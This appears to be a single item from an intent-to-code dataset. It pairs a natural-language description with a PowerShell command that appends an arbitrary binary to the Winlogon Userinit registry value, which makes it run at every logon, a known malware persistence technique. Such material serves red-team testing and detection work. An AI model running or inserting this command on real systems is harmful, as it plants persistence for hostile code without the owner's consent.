# Natural language intent:
# Set a registry property to execute a specified binary along with the Userinit process during system startup.

Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, ${bin_to_execute}" -Force
